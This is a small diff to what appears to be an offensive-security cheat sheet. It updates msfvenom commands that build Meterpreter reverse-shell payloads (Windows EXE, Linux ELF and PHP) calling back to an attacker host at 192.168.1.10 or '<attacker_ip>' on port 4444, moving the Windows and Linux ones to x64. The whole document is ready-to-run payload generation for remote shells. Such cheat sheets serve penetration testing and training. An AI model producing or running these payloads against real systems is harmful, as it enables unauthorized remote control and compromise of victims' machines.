@@ -61,11 +61,11 @@ exploit
 
 ```bash
 # Windows reverse shell
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o reverse_shell.exe
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o reverse_shell.exe
 # Linux reverse shell
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o reverse_shell.elf
+msfvenom -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o reverse_shell.elf
 # Linux ELF reverse shell
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf
+msfvenom -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf
 # PHP reverse shell
 msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php
 ```
